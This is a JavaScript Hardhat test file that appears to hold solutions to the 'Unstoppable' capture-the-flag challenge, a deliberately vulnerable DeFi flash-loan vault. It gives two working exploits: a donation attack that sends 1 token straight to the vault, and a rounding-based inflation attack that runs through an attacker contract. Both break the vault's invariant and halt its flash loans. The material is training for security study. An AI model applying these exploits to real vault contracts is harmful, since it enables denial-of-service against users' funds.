const { ethers } = require("hardhat");
const { expect } = require("chai");

describe("[Challenge] Unstoppable", function () {
  let deployer, player, someUser;
  let token, vault, receiverContract;

  const TOKENS_IN_VAULT = 1000000n * 10n ** 18n;
  const INITIAL_PLAYER_TOKEN_BALANCE = 10n * 10n ** 18n;

  before(async function () {
    /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */

    [deployer, player, someUser] = await ethers.getSigners();

    token = await (
      await ethers.getContractFactory("DamnValuableToken", deployer)
    ).deploy();
    vault = await (
      await ethers.getContractFactory("UnstoppableVault", deployer)
    ).deploy(
      token.address,
      deployer.address, // owner
      deployer.address // fee recipient
    );
    expect(await vault.asset()).to.eq(token.address);

    await token.approve(vault.address, TOKENS_IN_VAULT);
    await vault.deposit(TOKENS_IN_VAULT, deployer.address);

    expect(await token.balanceOf(vault.address)).to.eq(TOKENS_IN_VAULT);
    expect(await vault.totalAssets()).to.eq(TOKENS_IN_VAULT);
    expect(await vault.totalSupply()).to.eq(TOKENS_IN_VAULT);
    expect(await vault.maxFlashLoan(token.address)).to.eq(TOKENS_IN_VAULT);
    expect(await vault.flashFee(token.address, TOKENS_IN_VAULT - 1n)).to.eq(0);
    expect(await vault.flashFee(token.address, TOKENS_IN_VAULT)).to.eq(
      50000n * 10n ** 18n
    );

    await token.transfer(player.address, INITIAL_PLAYER_TOKEN_BALANCE);
    expect(await token.balanceOf(player.address)).to.eq(
      INITIAL_PLAYER_TOKEN_BALANCE
    );

    // Show it's possible for someUser to take out a flash loan
    receiverContract = await (
      await ethers.getContractFactory("ReceiverUnstoppable", someUser)
    ).deploy(vault.address);
    await receiverContract.executeFlashLoan(100n * 10n ** 18n);
  });

  it("Execution (donation attack)", async function () {
    /** CODE YOUR SOLUTION HERE */
    // Solution based on donation attack. A transfer of 1 DVT to the vault breaks the
    // UnstoppableVault:L96 invariant `convertToShares(totalSupply) == totalAssets()`
    // totalSupply = 1000000n * 10n ** 18n
    // totalAssets = totalSuppply + 1
    await token.transfer(vault.address, 1);
  });

  after(async function () {
    /** SUCCESS CONDITIONS - NO NEED TO CHANGE ANYTHING HERE */

    // It is no longer possible to execute flash loans
    await expect(
      receiverContract.executeFlashLoan(100n * 10n ** 18n)
    ).to.be.reverted;
  });
});

describe("[Challenge] Unstoppable", function () {
  let deployer, player, someUser;
  let token, vault, receiverContract;

  const TOKENS_IN_VAULT = 1000000n * 10n ** 18n;
  const INITIAL_PLAYER_TOKEN_BALANCE = 10n * 10n ** 18n;

  before(async function () {
    /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */

    [deployer, player, someUser] = await ethers.getSigners();

    token = await (
      await ethers.getContractFactory("DamnValuableToken", deployer)
    ).deploy();
    vault = await (
      await ethers.getContractFactory("UnstoppableVault", deployer)
    ).deploy(
      token.address,
      deployer.address, // owner
      deployer.address // fee recipient
    );
    expect(await vault.asset()).to.eq(token.address);

    await token.approve(vault.address, TOKENS_IN_VAULT);
    await vault.deposit(TOKENS_IN_VAULT, deployer.address);

    expect(await token.balanceOf(vault.address)).to.eq(TOKENS_IN_VAULT);
    expect(await vault.totalAssets()).to.eq(TOKENS_IN_VAULT);
    expect(await vault.totalSupply()).to.eq(TOKENS_IN_VAULT);
    expect(await vault.maxFlashLoan(token.address)).to.eq(TOKENS_IN_VAULT);
    expect(await vault.flashFee(token.address, TOKENS_IN_VAULT - 1n)).to.eq(0);
    expect(await vault.flashFee(token.address, TOKENS_IN_VAULT)).to.eq(
      50000n * 10n ** 18n
    );

    await token.transfer(player.address, INITIAL_PLAYER_TOKEN_BALANCE);
    expect(await token.balanceOf(player.address)).to.eq(
      INITIAL_PLAYER_TOKEN_BALANCE
    );

    // Show it's possible for someUser to take out a flash loan
    receiverContract = await (
      await ethers.getContractFactory("ReceiverUnstoppableAttacker", someUser)
    ).deploy(vault.address);
    await receiverContract.executeFlashLoan(100n * 10n ** 18n);
  });

  it("Execution (inflation attack)", async function () {
    /** CODE YOUR SOLUTION HERE */
    // Solution based on inflation attack. Incrementing the totalSupply by 2 DVT and withdrawing 1
    // during the flashloan will make that `previewWithdraw()` returns 2 shares to be burn instead
    // of 1 (due to `mulDivUp()` rounds up). Burning 2 DVT but withdrawing 1 DVT will break the
    // UnstoppableVault:L96 invariant `convertToShares(totalSupply) == totalAssets()`.
    const depositAmount = 2;
    await token.approve(vault.address, depositAmount);
    await vault.deposit(depositAmount, receiverContract.address);
    const borrowAmount = 1;
    const withdrawAmount = 1;
    await receiverContract.executeFlashLoanAttack(borrowAmount, withdrawAmount);

    const totalSupply = await vault.totalSupply();
    const totalAssets = await vault.totalAssets();
    expect(totalSupply).to.not.eq(totalAssets); // Invariant broken
    expect(totalSupply).to.eq(TOKENS_IN_VAULT); // Due to 2 DVT (shares) burnt
    expect(totalAssets).to.eq(TOKENS_IN_VAULT + BigInt(withdrawAmount)); // Due to 1 DVT withdrawn
  });

  after(async function () {
    /** SUCCESS CONDITIONS - NO NEED TO CHANGE ANYTHING HERE */

    // It is no longer possible to execute flash loans
    await expect(
      receiverContract.executeFlashLoan(100n * 10n ** 18n)
    ).to.be.reverted;
  });
});
